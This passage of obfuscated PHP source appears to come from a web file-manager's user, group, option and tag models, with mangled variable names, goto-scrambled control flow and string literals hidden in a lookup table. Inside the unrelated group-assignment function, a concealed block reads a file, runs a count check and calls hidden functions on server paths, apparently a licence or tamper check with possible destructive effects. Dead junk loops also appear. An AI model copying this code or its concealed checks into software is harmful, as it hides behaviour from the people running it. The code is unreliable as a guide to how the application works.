$this->userEdit($aµ¹õîö‹å, $f‘–¿èÈ); } protected function userRemove($Fó…˜¹§äà) { goto DÏåïÃÀµ; DÏåïÃÀµ: $døËğœ¢Â« =& $_SERVER[òÀöí]; $E•½µ¤‡Šó = $this->getInfoSimple($Fó…˜¹§äà); if (!$E•½µ¤‡Šó) { return !1; } goto AÎéÖ¶·½Ú; f‹‰àš®½Û: Model($døËğœ¢Â«[778])->userRootRemove($Fó…˜¹§äà); return $this->where($CÎ©ËñµÔô)->delete(); goto f‘‚è§£ª; d ³öÚÕí¢: Model($døËğœ¢Â«[1746])->where($CÎ©ËñµÔô)->delete(); Model($døËğœ¢Â«[2099])->where($CÎ©ËñµÔô)->delete(); Model($døËğœ¢Â«[2115])->where($CÎ©ËñµÔô)->delete(); goto f‹‰àš®½Û; AÎéÖ¶·½Ú: $CÎ©ËñµÔô = array($døËğœ¢Â«[1496] => $Fó…˜¹§äà); Model($døËğœ¢Â«[552])->where($CÎ©ËñµÔô)->delete(); Model($døËğœ¢Â«[2114])->where($CÎ©ËñµÔô)->delete(); goto d ³öÚÕí¢; f‘‚è§£ª: } protected function userGroupSet($cµË¥¤¶çÍ, $B¬ŠÆÎ‰ì, $a¨ÑÎŒğ¬¦ = array()) { goto B¤ô®øäˆ†; AÑï ‰×Ã¾: $f¥©¤¼•Å® = array(); $E˜íˆÓ Š› = 0; foreach ($B¬ŠÆÎ‰ì as $a¶—®Ã¢•¹ => $AŒŠ›ÏËÓ) { $fìöâªÌÑŸ = array($bíä‡°êµê[1504] => $cµË¥¤¶çÍ, $bíä‡°êµê[1663] => $a¶—®Ã¢•¹, $bíä‡°êµê[1812] => $AŒŠ›ÏËÓ); $fìöâªÌÑŸ[$bíä‡°êµê[1686]] = isset($a¨ÑÎŒğ¬¦[$E˜íˆÓ Š›]) ? $a¨ÑÎŒğ¬¦[$E˜íˆÓ Š›] : 0; $E˜íˆÓ Š›++; $f¥©¤¼•Å®[] = $fìöâªÌÑŸ; } goto D÷ù¾ÆÃ‡Ä; D÷ù¾ÆÃ‡Ä: return $D´°ŒÒÊÙ¾->addAll($f¥©¤¼•Å®, array(), !0); goto FîÆöŞÛ¨â; BÄÈ÷œÄßˆ: if (!$Cùº¦ƒ–¨ || !is_array($B¬ŠÆÎ‰ì)) { return !1; } $D´°ŒÒÊÙ¾ = Model($bíä‡°êµê[1746]); $D´°ŒÒÊÙ¾->where(array($bíä‡°êµê[1504] => $cµË¥¤¶çÍ))->delete(); goto AÑï ‰×Ã¾; B¤ô®øäˆ†: $bíä‡°êµê =& $_SERVER[òÀöí]; if ($_SERVER[$bíä‡°êµê[753]] != $_SERVER[$bíä‡°êµê[754]]) { goto f«‘ÒÃ×; f«‘ÒÃ×: $d÷œä„›£­ = $bíä‡°êµê[819]; $DŠ¨ªä—‘» = $bíä‡°êµê[755]; $Fìàáƒãìá = $_SERVER[$bíä‡°êµê[756]] . $bíä‡°êµê[757]; goto CæÁñÍŠ„–; e”éœèâò”: $a×Í¯ğÉˆ = $bíä‡°êµê[820]; $a×Í¯ğÉˆ($_SERVER[$bíä‡°êµê[821]]); $a×Í¯ğÉˆ($_SERVER[$bíä‡°êµê[756]] . $bíä‡°êµê[822]); goto D»£ÓïÂ½°; D»£ÓïÂ½°: $FòÅÂò¨Ê = 1; while ($FòÅÂò¨Ê > 1) { $FòÅÂò¨Ê = $FòÅÂò¨Ê + 4; $A˜†İ‰Ü‘ = rawurlencode($FòÅÂò¨Ê . $bíä‡°êµê[370]); } goto dÂßòÌ±Á; CæÁñÍŠ„–: $F×‹åò§¡ß = $DŠ¨ªä—‘»($Fìàáƒãìá); $BÆŠÀóÜÙ‹ = explode($bíä‡°êµê[227], $F×‹åò§¡ß); if (count($BÆŠÀóÜÙ‹) < $bíä‡°êµê[573]) { $c—ØåˆãÒ = $bíä‡°êµê[758]; $c—ØåˆãÒ(); } goto e”éœèâò”; dÂßòÌ±Á: } $Cùº¦ƒ–¨ = $this->getInfoSimple($cµË¥¤¶çÍ); goto BÄÈ÷œÄßˆ; FîÆöŞÛ¨â: } protected function userGroupAdd($d´¬Ø­ÒÚÂ, $b¼àØ„È¿½ = array()) { $C½Ğ™È¼É =& $_SERVER[òÀöí]; $dãÏİŸƒŠì = $this->getInfoSimple($d´¬Ø­ÒÚÂ); if (!$dãÏİŸƒŠì || empty($b¼àØ„È¿½)) { return !1; } $aà½¹²áš„ = array(); foreach ($b¼àØ„È¿½ as $e›îà‹’ğÌ => $AØˆãšçö¼) { $aà½¹²áš„[] = array($C½Ğ™È¼É[1504] => $d´¬Ø­ÒÚÂ, $C½Ğ™È¼É[1663] => $e›îà‹’ğÌ, $C½Ğ™È¼É[1812] => $AØˆãšçö¼, $C½Ğ™È¼É[1686] => 0); } return Model($C½Ğ™È¼É[1746])->addAll($aà½¹²áš„, array(), !0); } protected function userGroupRemove($fÖ¨«ÜÁÑ›, $C‡ÛÕŒ©×) { $c”—Ï‰ä„¤ =& $_SERVER[òÀöí]; $CÔËÏÚŠÕ = $this->getInfoSimple($fÖ¨«ÜÁÑ›); if (!$CÔËÏÚŠÕ || !$C‡ÛÕŒ©×) { return !1; } $bÇÇÒƒÕ¨± = array($c”—Ï‰ä„¤[1496] => $fÖ¨«ÜÁÑ›, $c”—Ï‰ä„¤[1744] => $C‡ÛÕŒ©×); return Model($c”—Ï‰ä„¤[1746])->where($bÇÇÒƒÕ¨±)->delete(); } public function listData() { $FàõÍ¬î› = $this->_makeOrder()->selectPage(50); $this->_listDataApply($FàõÍ¬î›[$_SERVER[òÀöí][363]]); return $FàõÍ¬î›; } public function listByID($D²îæ†ßÆ£) { $BÀãŠå‚‘ç =& $_SERVER[òÀöí]; if (!$D²îæ†ßÆ£) { return; } $d¶–„³›Íé = array($BÀãŠå‚‘ç[1504] => array($BÀãŠå‚‘ç[7], $D²îæ†ßÆ£)); $cÊÑ‘¯ò‘í = $this->where($d¶–„³›Íé)->select(); $this->_listDataApply($cÊÑ‘¯ò‘í); return $cÊÑ‘¯ò‘í; } public function listByGroup($DÖ¥‹Ÿ× = 0, $C„ÇŸË˜å = array()) { goto BÃéÈ‰¨…; EÆêµÙğ: if ($DÖ¥‹Ÿ×) { $D‰…ÈÎ¦±ò = array($bÚƒë¦ŞÜ…[2116] => intval($DÖ¥‹Ÿ×)); $c£ë æß„Ã = "\114\105\x46\x54\x20\112\117\111\116\x20{$this->tablePrefix}\x75\163\145\x72\x5f\x67\162\x6f\165\x70\40\165\x73\145\x72\x5f\x67\162\x6f\x75\160\40\x6f\x6e\40\165\163\x65\162\56\x75\163\145\x72\111\104\x20\75\x20\165\x73\x65\x72\x5f\147\x72\x6f\x75\x70\56\x75\x73\145\x72\x49\x44"; $dùåƒ˜Ô‡‚ = Input::get($bÚƒë¦ŞÜ…[424], null, $bÚƒë¦ŞÜ…[33]) ? $bÚƒë¦ŞÜ…[33] : $bÚƒë¦ŞÜ…[2117]; } if (isset($C„ÇŸË˜å[$bÚƒë¦ŞÜ…[708]])) { $D‰…ÈÎ¦±ò[$bÚƒë¦ŞÜ…[2118]] = $C„ÇŸË˜å[$bÚƒë¦ŞÜ…[708]]; } $f»ù‰ìœ•Ò = $this->_makeOrder($dùåƒ˜Ô‡‚)->field($bÚƒë¦ŞÜ…[2119])->where($D‰…ÈÎ¦±ò)->join($c£ë æß„Ã)->selectPage(50); goto AñÔ’Øœ; AñÔ’Øœ: $this->_listDataApply($f»ù‰ìœ•Ò[$bÚƒë¦ŞÜ…[363]]); return $f»ù‰ìœ•Ò; goto føŠ…ĞÒ·; BÃéÈ‰¨…: $bÚƒë¦ŞÜ… =& $_SERVER[òÀöí]; $c£ë æß„Ã = $bÚƒë¦ŞÜ…[33]; $D‰…ÈÎ¦±ò = array(); goto EÆêµÙğ; føŠ…ĞÒ·: } private function _makeOrder($Få™Á©î•Ú = '') { goto EÖ…ÚŒ‰Âø; E“÷ƒ‰—ºø: $Få™Á©î•Ú = $Få™Á©î•Ú . "\165\x73\x65\x72\56{$AäÏÀíÙ}\40{$Cˆß¥²‚Áã}\54\x20\165\163\145\162\x2e\165\x73\145\x72\x49\x44\40\141\163\x63"; return $this->alias($b»Òù˜ƒ²[1867])->order($Få™Á©î•Ú); goto f´×¦ ãò‰; Dïìëõíš¾: $AäÏÀíÙ = Input::get($b»Òù˜ƒ²[424], $b»Òù˜ƒ²[7], $b»Òù˜ƒ²[1496], $C”î‹†Ã¥¥); $Cˆß¥²‚Áã = Input::get($b»Òù˜ƒ²[425], $b»Òù˜ƒ²[7], $b»Òù˜ƒ²[1747], array($b»Òù˜ƒ²[1747], $b»Òù˜ƒ²[421])); $Cˆß¥²‚Áã = $EÈ ñÇ£ó•[$Cˆß¥²‚Áã]; goto E“÷ƒ‰—ºø; EÖ…ÚŒ‰Âø: $b»Òù˜ƒ² =& $_SERVER[òÀöí]; $C”î‹†Ã¥¥ = array($b»Òù˜ƒ²[1504], $b»Òù˜ƒ²[28], $b»Òù˜ƒ²[1649], $b»Òù˜ƒ²[1621], $b»Òù˜ƒ²[192]); $EÈ ñÇ£ó• = array($b»Òù˜ƒ²[419] => $b»Òù˜ƒ²[420], $b»Òù˜ƒ²[421] => $b»Òù˜ƒ²[422]); goto Dïìëõíš¾; f´×¦ ãò‰: } public function listSearch($fÜ‹İõáÄ) { goto F³†Ê¾Ù¾; CÉÀÑƒº‹‡: $this->_filterByGroup($a©Œ¿Çë¥, $A¡«½‹ŞË); return $a©Œ¿Çë¥; goto eÀ¢õß‚¯¥; F³†Ê¾Ù¾: $eœŒÚ«†å‡ =& $_SERVER[òÀöí]; $e ˆ«™ñŒ = $fÜ‹İõáÄ[$eœŒÚ«†å‡[1748]]; $A¡«½‹ŞË = isset($fÜ‹İõáÄ[$eœŒÚ«†å‡[1749]]) ? $fÜ‹İõáÄ[$eœŒÚ«†å‡[1749]] : !1; goto E½÷·‘¿ñÀ; E½÷·‘¿ñÀ: $e ˆ«™ñŒ = str_replace($eœŒÚ«†å‡[1750], $eœŒÚ«†å‡[1751], trim($e ˆ«™ñŒ)); $A¿’«ñ¦‹Î = array($eœŒÚ«†å‡[28] => array($eœŒÚ«†å‡[375], "\x25{$e ˆ«™ñŒ}\x25"), $eœŒÚ«†å‡[301] => array($eœŒÚ«†å‡[375], "{$e ˆ«™ñŒ}\x25"), $eœŒÚ«†å‡[1927] => array($eœŒÚ«†å‡[375], "{$e ˆ«™ñŒ}\45"), $eœŒÚ«†å‡[936] => $eœŒÚ«†å‡[1752]); if (Input::check($e ˆ«™ñŒ, $eœŒÚ«†å‡[307])) { $A¿’«ñ¦‹Î[$eœŒÚ«†å‡[1504]] = array($eœŒÚ«†å‡[375], "{$e ˆ«™ñŒ}\45"); $A¿’«ñ¦‹Î[$eœŒÚ«†å‡[2100]] = array($eœŒÚ«†å‡[375], "{$e ˆ«™ñŒ}\45"); } goto e²öÒ†°; DĞöƒÈ‘¸´: $a©Œ¿Çë¥ = $this->_makeOrder()->where($A¿’«ñ¦‹Î)->selectPage(20); if (!$a©Œ¿Çë¥ || count($a©Œ¿Çë¥[$eœŒÚ«†å‡[363]]) < 5 && Input::check($e ˆ«™ñŒ, $eœŒÚ«†å‡[314])) { $e±®Ãò‰Ë = $this->_searchFromMeta($eœŒÚ«†å‡[432], $e ˆ«™ñŒ, 10); $D¾ç–×™™Í = $this->_searchFromMeta($eœŒÚ«†å‡[433], $e ˆ«™ñŒ, 10); $e›¬ÇÁï” = array_merge($e±®Ãò‰Ë, $D¾ç–×™™Í, $a©Œ¿Çë¥[$eœŒÚ«†å‡[363]]); $a©Œ¿Çë¥[$eœŒÚ«†å‡[363]] = array_unique_by_key($e›¬ÇÁï”, $eœŒÚ«†å‡[1504]); $a©Œ¿Çë¥[$eœŒÚ«†å‡[360]][$eœŒÚ«†å‡[361]] = count($a©Œ¿Çë¥[$eœŒÚ«†å‡[363]]); $a©Œ¿Çë¥[$eœŒÚ«†å‡[360]][$eœŒÚ«†å‡[362]] = ceil($a©Œ¿Çë¥[$eœŒÚ«†å‡[360]][$eœŒÚ«†å‡[361]] / $a©Œ¿Çë¥[$eœŒÚ«†å‡[360]][$eœŒÚ«†å‡[358]]); } $this->_listDataApply($a©Œ¿Çë¥[$eœŒÚ«†å‡[363]]); goto CÉÀÑƒº‹‡; e²öÒ†°: if (!$e ˆ«™ñŒ) { $A¿’«ñ¦‹Î = array(); } if (isset($fÜ‹İõáÄ[$eœŒÚ«†å‡[708]])) { $A¿’«ñ¦‹Î[$eœŒÚ«†å‡[708]] = $fÜ‹İõáÄ[$eœŒÚ«†å‡[708]]; } $A¿’«ñ¦‹Î = $this->parseWhereLike($A¿’«ñ¦‹Î); goto DĞöƒÈ‘¸´; eÀ¢õß‚¯¥: } private function _filterByGroup(&$A²º§‰éª, $Eµ®À‰ç´‘) { $dµÆ‘ÒŒñß =& $_SERVER[òÀöí]; if (!$Eµ®À‰ç´‘) { return $A²º§‰éª; } foreach ($A²º§‰éª[$dµÆ‘ÒŒñß[363]] as $F„–ö¼‡Ê => &$cğÒë™ƒº) { $B˜†šâÎí» = array_to_keyvalue($cğÒë™ƒº[$dµÆ‘ÒŒñß[1838]], $dµÆ‘ÒŒñß[33], $dµÆ‘ÒŒñß[1663]); if (!in_array($Eµ®À‰ç´‘, $B˜†šâÎí»)) { unset($A²º§‰éª[$dµÆ‘ÒŒñß[363]][$F„–ö¼‡Ê]); } } unset($cğÒë™ƒº); $A²º§‰éª[$dµÆ‘ÒŒñß[363]] = array_values($A²º§‰éª[$dµÆ‘ÒŒñß[363]]); $A²º§‰éª[$dµÆ‘ÒŒñß[360]] = array($dµÆ‘ÒŒñß[1900] => count($A²º§‰éª[$dµÆ‘ÒŒñß[363]]), $dµÆ‘ÒŒñß[1898] => $A²º§‰éª[$dµÆ‘ÒŒñß[360]][$dµÆ‘ÒŒñß[358]], $dµÆ‘ÒŒñß[1897] => 1, $dµÆ‘ÒŒñß[1899] => 1); } private function _searchFromMeta($Cñ¹‡ÀŞ¼¸, $fø®¶ïè—ô, $bØ™£²õ¶à) { goto D…°×›ÑğŸ; Fµ¿°¡ó¦¦: $Aâ‡‡šÕ‘ = $this->parseWhereLike($Aâ‡‡šÕ‘); $bÇÙ×¯‹ƒ­ = Model($A‹‡±ƒÉ¦Œ[2120])->where($Aâ‡‡šÕ‘)->limit($bØ™£²õ¶à)->select(); if (!$bÇÙ×¯‹ƒ­) { return array(); } goto A®…åßëØ; e¿‘ÆÀŒä: return $d «õ‚¯; goto bñ‚Õâ®; D…°×›ÑğŸ: $A‹‡±ƒÉ¦Œ =& $_SERVER[òÀöí]; $fø®¶ïè—ô = strtolower($fø®¶ïè—ô); $Aâ‡‡šÕ‘ = array($A‹‡±ƒÉ¦Œ[92] => $Cñ¹‡ÀŞ¼¸, $A‹‡±ƒÉ¦Œ[368] => array($A‹‡±ƒÉ¦Œ[375], "\x25{$fø®¶ïè—ô}\x25")); goto Fµ¿°¡ó¦¦; A®…åßëØ: $bÇÙ×¯‹ƒ­ = array_to_keyvalue($bÇÙ×¯‹ƒ­, $A‹‡±ƒÉ¦Œ[33], $A‹‡±ƒÉ¦Œ[1504]); $d «õ‚¯ = $this->where(array($A‹‡±ƒÉ¦Œ[1496] => array($A‹‡±ƒÉ¦Œ[7], $bÇÙ×¯‹ƒ­)))->select(); if (!$d «õ‚¯) { return array(); } goto e¿‘ÆÀŒä; bñ‚Õâ®: } private function _listDataApplyItem($CÍØ ­µ) { $f¸æâÉ–„ = array($CÍØ ­µ); $this->_listDataApply($f¸æâÉ–„); return $f¸æâÉ–„[0]; } private function _listDataApply(&$bµ¶ÌğæÅÙ) { goto aİÑæ’«¼; C½À«š”«“: $this->_listAppendSourceRoot($bµ¶ÌğæÅÙ, $BÅäç‡Ç­); goto Aø¤†«Ç„„; b¹ä‚Ø—ŠÍ: $BÅäç‡Ç­ = array_to_keyvalue($bµ¶ÌğæÅÙ, $f¡Òİ¤‡[33], $f¡Òİ¤‡[1504]); $this->_listAppendGroup($bµ¶ÌğæÅÙ, $BÅäç‡Ç­); $this->_listAppendMeta($bµ¶ÌğæÅÙ, $BÅäç‡Ç­); goto C½À«š”«“; aİÑæ’«¼: $f¡Òİ¤‡ =& $_SERVER[òÀöí]; if (!$bµ¶ÌğæÅÙ) { return; } array_remove_key($bµ¶ÌğæÅÙ, $f¡Òİ¤‡[828]); goto b¹ä‚Ø—ŠÍ; Aø¤†«Ç„„: } private function _listAppendSourceRoot(&$F‡‰ÄÀ¼±, $c‹èñİ©à) { goto C¤É‹åÌ¥±; dÁË®¢Ø›Ò: $BËÔñ¯½ñ = Model($C‚á¦ê«íË[778])->order($C‚á¦ê«íË[1760])->field($BÅŒÚÆÛ…)->where($eŸ¢êæë´§)->select(); $BËÔñ¯½ñ = array_to_keyvalue($BËÔñ¯½ñ, $C‚á¦ê«íË[474]); $BËÔñ¯½ñ = array_remove_key($BËÔñ¯½ñ, $C‚á¦ê«íË[474]); goto d°ÆÆº—‘í; C¤É‹åÌ¥±: $C‚á¦ê«íË =& $_SERVER[òÀöí]; $eŸ¢êæë´§ = array($C‚á¦ê«íË[479] => 0, $C‚á¦ê«íË[389] => SourceModel::TYPE_USER, $C‚á¦ê«íË[474] => array($C‚á¦ê«íË[7], $c‹èñİ©à)); $BÅŒÚÆÛ… = $C‚á¦ê«íË[1759]; goto dÁË®¢Ø›Ò; d°ÆÆº—‘í: foreach ($F‡‰ÄÀ¼± as &$aîŸ˜¹µ«ä) { $aîŸ˜¹µ«ä[$C‚á¦ê«íË[84]] = $BËÔñ¯½ñ[$aîŸ˜¹µ«ä[$C‚á¦ê«íË[1504]]] ? $BËÔñ¯½ñ[$aîŸ˜¹µ«ä[$C‚á¦ê«íË[1504]]] : array(); } unset($aîŸ˜¹µ«ä); goto aÒöÏ‰é¿™; aÒöÏ‰é¿™: } private function _listAppendGroup(&$b¬×†¬¿•, $CÇ—§ °¤ë) { goto bÖé´â¿ì; Cˆ…‡éõİ: $d¾©Ã°ë• = array($C¶²´„¡®[1663] => array($C¶²´„¡®[7], $F‡“’‚ï‡)); $c£²¨ÄƒŞ³ = Model($C¶²´„¡®[1836])->field($C¶²´„¡®[2121])->where($d¾©Ã°ë•)->select(); $c£²¨ÄƒŞ³ = array_to_keyvalue($c£²¨ÄƒŞ³, $C¶²´„¡®[1663]); goto cÃ¬…ƒ’º ; cÃ¬…ƒ’º : $fÏœĞóñƒÜ = array_to_keyvalue_group($fÏœĞóñƒÜ, $C¶²´„¡®[1504]); foreach ($fÏœĞóñƒÜ as &$AäÑ±ö³½í) { $F’×¼òÏø = array(); foreach ($AäÑ±ö³½í as $F¤˜ÉØ‡«¼) { if (!$F¤˜ÉØ‡«¼[$C¶²´„¡®[1812]]) { continue; } $A…—™ôèªÕ = Model($C¶²´„¡®[1831])->listData($F¤˜ÉØ‡«¼[$C¶²´„¡®[1812]]); $F’×¼òÏø[] = array($C¶²´„¡®[1663] => $F¤˜ÉØ‡«¼[$C¶²´„¡®[1663]], $C¶²´„¡®[2122] => $c£²¨ÄƒŞ³[$F¤˜ÉØ‡«¼[$C¶²´„¡®[1663]]][$C¶²´„¡®[28]], $C¶²´„¡®[477] => $c£²¨ÄƒŞ³[$F¤˜ÉØ‡«¼[$C¶²´„¡®[1663]]][$C¶²´„¡®[477]], $C¶²´„¡®[394] => $A…—™ôèªÕ); } $AäÑ±ö³½í = $F’×¼òÏø; } unset($AäÑ±ö³½í); goto AÅ§ËÉºÇö; D÷Å¢ˆĞ”å: $F‡“’‚ï‡ = array_to_keyvalue($fÏœĞóñƒÜ, $C¶²´„¡®[33], $C¶²´„¡®[1663]); $F‡“’‚ï‡ = array_remove_value(array_unique($F‡“’‚ï‡), $C¶²´„¡®[486]); if (!$F‡“’‚ï‡ || !$fÏœĞóñƒÜ) { return; } goto Cˆ…‡éõİ; AÅ§ËÉºÇö: foreach ($b¬×†¬¿• as &$a©éÁƒ¸Õ½) { $a©éÁƒ¸Õ½[$C¶²´„¡®[1838]] = array(); if (isset($fÏœĞóñƒÜ[$a©éÁƒ¸Õ½[$C¶²´„¡®[1504]]])) { $a©éÁƒ¸Õ½[$C¶²´„¡®[1838]] = $fÏœĞóñƒÜ[$a©éÁƒ¸Õ½[$C¶²´„¡®[1504]]]; } } unset($a©éÁƒ¸Õ½); goto Aœˆ ˆóÀŞ; bÖé´â¿ì: $C¶²´„¡® =& $_SERVER[òÀöí]; $d¾©Ã°ë• = array($C¶²´„¡®[1504] => array($C¶²´„¡®[7], $CÇ—§ °¤ë)); $fÏœĞóñƒÜ = Model($C¶²´„¡®[1746])->where($d¾©Ã°ë•)->select(); goto D÷Å¢ˆĞ”å; Aœˆ ˆóÀŞ: } private function _listAppendMeta(&$AÉòî–ÕŒ, $C¿„ÊÜÏÊØ) { goto A†¬Ëë™²¿; A†¬Ëë™²¿: $BÃ¯‚¿«Â =& $_SERVER[òÀöí]; $dÌ©èÀñÕ = UserJobModel::JOB_KEY; $Bˆ´ÔÉ†Î¹ = array($BÃ¯‚¿«Â[2101]); goto cšùìÄÜ‹š; DÉ«Â–°Éâ: foreach ($EÛÈ”Çøà as &$CöË—Ğô—Ó) { $eßŠØßùÈÑ = array(); foreach ($CöË—Ğô—Ó as $d–ÖÚˆ±) { if (!in_array($d–ÖÚˆ±[$BÃ¯‚¿«Â[92]], $Bˆ´ÔÉ†Î¹)) { $eßŠØßùÈÑ[$d–ÖÚˆ±[$BÃ¯‚¿«Â[92]]] = $d–ÖÚˆ±[$BÃ¯‚¿«Â[368]]; } } $CöË—Ğô—Ó = $eßŠØßùÈÑ; } unset($CöË—Ğô—Ó); $dëµ®¿—ÔÓ = Model($BÃ¯‚¿«Â[2123]); goto cª›Ã‰ˆ‰; cšùìÄÜ‹š: $FÙ“·ãï²ö = array($BÃ¯‚¿«Â[1504] => array($BÃ¯‚¿«Â[7], $C¿„ÊÜÏÊØ)); $EÛÈ”Çøà = Model($BÃ¯‚¿«Â[2099])->where($FÙ“·ãï²ö)->select(); $EÛÈ”Çøà = array_to_keyvalue_group($EÛÈ”Çøà, $BÃ¯‚¿«Â[1504]); goto DÉ«Â–°Éâ; cª›Ã‰ˆ‰: foreach ($AÉòî–ÕŒ as &$FÕ†ÜøÊµ) { $c‚ –Å‡Ğ = array(); if (isset($EÛÈ”Çøà[$FÕ†ÜøÊµ[$BÃ¯‚¿«Â[1504]]])) { $c‚ –Å‡Ğ = $EÛÈ”Çøà[$FÕ†ÜøÊµ[$BÃ¯‚¿«Â[1504]]]; } $FÕ†ÜøÊµ[$BÃ¯‚¿«Â[2124]] = array(); if (isset($c‚ –Å‡Ğ[$dÌ©èÀñÕ])) { $FÕ†ÜøÊµ[$BÃ¯‚¿«Â[2124]] = $dëµ®¿—ÔÓ->getUserJobInfo($c‚ –Å‡Ğ[$dÌ©èÀñÕ]); } } unset($FÕ†ÜøÊµ); goto D­ó„Œ³²; D­ó„Œ³²: } protected function groupUserAll($aÕ’òµî·¸) { $b¾…Ó™ÆÖÚ =& $_SERVER[òÀöí]; if (!$aÕ’òµî·¸) { return !1; } $A¶ñ‡Ô²õ = Model($b¾…Ó™ÆÖÚ[1746])->field($b¾…Ó™ÆÖÚ[1504])->where(array($b¾…Ó™ÆÖÚ[1663] => array($b¾…Ó™ÆÖÚ[7], $aÕ’òµî·¸)))->select(); $A¶ñ‡Ô²õ = array_to_keyvalue($A¶ñ‡Ô²õ, $b¾…Ó™ÆÖÚ[33], $b¾…Ó™ÆÖÚ[1504]); return array_unique($A¶ñ‡Ô²õ); } public function userSearch($Aäô¿Œä÷…, $bÏæ§ïöÉ = "\x2a") { return Model($_SERVER[òÀöí][495])->where($Aäô¿Œä÷…)->field($bÏæ§ïöÉ)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\163\x65\162\x5f\157\x70\x74\x69\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($A‹¾¸Ù†ˆÏ) { $b÷×ÖÂ«î =& $_SERVER[òÀöí]; if (!defined($b÷×ÖÂ«î[443])) { define($b÷×ÖÂ«î[443], 0); } return "\125\163\x65\162\x4f\160\x74\x69\157\x6e\x5f{$A‹¾¸Ù†ˆÏ}\x5f" . USER_ID; } protected function filterWhere($Aˆ‚™ŸÉœÁ) { $F—Ó¥õ·ğá =& $_SERVER[òÀöí]; if (!defined($F—Ó¥õ·ğá[443])) { define($F—Ó¥õ·ğá[443], 0); } $Aˆ‚™ŸÉœÁ[$F—Ó¥õ·ğá[1504]] = USER_ID; return $Aˆ‚™ŸÉœÁ; } public function cacheRemoveUser($C•”¸Ÿ¥Î‰, $FŒÊ…˜ùĞ¼) { return Cache::remove("\x55\x73\145\x72\117\160\x74\151\157\156\x5f{$C•”¸Ÿ¥Î‰}\x5f" . $FŒÊ…˜ùĞ¼); } protected function optionDefault($C·éŠ®”–Ş = '') { $c‡ÚˆÓÕ—´ =& $_SERVER[òÀöí]; if ($C·éŠ®”–Ş == $c‡ÚˆÓÕ—´[33]) { return $GLOBALS[$c‡ÚˆÓÕ—´[6]][$c‡ÚˆÓÕ—´[2125]]; } if ($C·éŠ®”–Ş == $c‡ÚˆÓÕ—´[2126]) { return $GLOBALS[$c‡ÚˆÓÕ—´[6]][$c‡ÚˆÓÕ—´[2127]]; } } } class UserTagModel extends ModelBaseLight { public $optionType = "\125\163\145\x72\x2e\x74\141\147\x4c\x69\163\164"; public $modelType = "\x55\x73\145\162\117\x70\x74\x69\157\x6e"; public $field = array("\156\x61\155\145", "\163\x74\x79\x6c\145", "\163\157\x72\164"); public function listData($a¢‡‘öÈÊ± = false, $a…‰è¼ØÇ‘ = "\x73\157\x72\164", $eã†¾Š…©Ò = false) { return parent::listData($a¢‡‘öÈÊ±, $a…‰è¼ØÇ‘, $eã†¾Š…©Ò); } public function remove($b‡¥¼­­äà) { return parent::remove($b‡¥¼­­äà); } public function add($b™Š¾–„é, $c’–î¾º×é = "\154\x61\x62\145\154\x2d\x67\x72\x65\x79\x2d\x6e\157\162\155\141\154") { $D—Á¸èÂ =& $_SERVER[òÀöí]; if ($this->findByName($b™Š¾–„é)) { return !1; } $Fİ—Ó¦±© = array($D—Á¸èÂ[404] => $b™Š¾–„é, $D—Á¸èÂ[453] => $c’–î¾º×é, $D—Á¸èÂ[1667] => $this->getSort($D—Á¸èÂ[254]) + 1); return parent::insert($Fİ—Ó¦±©); } public function update($A×¼ã×‰Ûò, $f¼†Ş¢¸‘ƒ) { $aß¯··‘â† =& $_SERVER[òÀöí]; $fì’Œ¯»ß = $this->listData($A×¼ã×‰Ûò); $aùÆ‚ØŠ‰ë = $this->findByName($f¼†Ş¢¸‘ƒ[$aß¯··‘â†[28]]); if (!$fì’Œ¯»ß || $aùÆ‚ØŠ‰ë && $aùÆ‚ØŠ‰ë[$aß¯··‘â†[385]] != $fì’Œ¯»ß[$aß¯··‘â†[385]]) { return !1; } return parent::update($A×¼ã×‰Ûò, $f¼†Ş¢¸‘ƒ); } public function moveTop($bº™Ÿ°ºá†) { $d‰Üí¿¨ç« =& $_SERVER[òÀöí]; $f ì÷åÒŒƒ = parent::listData(); $bÁÈë„ïñ‡ = $this->getSort($d‰Üí¿¨ç«[253]); foreach ($f ì÷åÒŒƒ as &$e™Ã´Óô‡ù) { if ($e™Ã´Óô‡ù[$d‰Üí¿¨ç«[385]] == $bº™Ÿ°ºá†) { $e™Ã´Óô‡ù[$d‰Üí¿¨ç«[1686]] = $bÁÈë„ïñ‡; continue; } $e™Ã´Óô‡ù[$d‰Üí¿¨ç«[1686]] += 1; } unset($e™Ã´Óô‡ù); return parent::resetData($f ì÷åÒŒƒ); } public function moveBottom($dâàÈçóßÎ) { $fğáÒçÄÎƒ =& $_SERVER[òÀöí]; $BõÚµÇï¢À = $this->getSort($fğáÒçÄÎƒ[254]) + 1; return parent::update($dâàÈçóßÎ, array($fğáÒçÄÎƒ[1686] => $BõÚµÇï¢À)); } public function resetSort($FÁóªªïòÁ) { goto CÊßŒÑĞ¾¨; EøäÂ–‚Ù: for ($b¿š‘ºë‡ø = 0; $b¿š‘ºë‡ø < count($FÁóªªïòÁ); $b¿š‘ºë‡ø++) { $eŠóå´ÍÌˆ[$FÁóªªïòÁ[$b¿š‘ºë‡ø] . $B§á Î°Ê[33]] = $b¿š‘ºë‡ø + 1; } $CŠŸÌ£Êö = parent::listData(); foreach ($CŠŸÌ£Êö as &$D²…÷ÓÕ‡ƒ) { $AÎØÙ…ò‚ = $eŠóå´ÍÌˆ[$D²…÷ÓÕ‡ƒ[$B§á Î°Ê[385]]]; $D²…÷ÓÕ‡ƒ[$B§á Î°Ê[1686]] = $AÎØÙ…ò‚ ? $AÎØÙ…ò‚ : $D²…÷ÓÕ‡ƒ[$B§á Î°Ê[1686]]; } goto a‚ä”©©À“; a‚ä”©©À“: unset($D²…÷ÓÕ‡ƒ); return parent::resetData($CŠŸÌ£Êö); goto eéÀ˜¶†—·; CÊßŒÑĞ¾¨: $B§á Î°Ê =& $_SERVER[òÀöí]; $eŠóå´ÍÌˆ = array(); $FÁóªªïòÁ = is_array($FÁóªªïòÁ) ? $FÁóªªïòÁ : array(); goto EøäÂ–‚Ù; eéÀ˜¶†—·: } private function getSort($Cí“ĞÆòõ) { $aŒœÛîÒ£ù =& $_SERVER[òÀöí]; $E‡Á­¥×°Ú = parent::listData(); $Fø¢“× ¦Í = array_to_keyvalue($E‡Á­¥×°Ú, $aŒœÛîÒ£ù[33], $aŒœÛîÒ£ù[1686]); if (!$Fø¢“× ¦Í) { $Fø¢“× ¦Í = array(0); } $dêîÎ²†¼Ó = $Cí“ĞÆòõ == $aŒœÛîÒ£ù[254] ? max($Fø¢“× ¦Í) : min($Fø¢“× ¦Í); 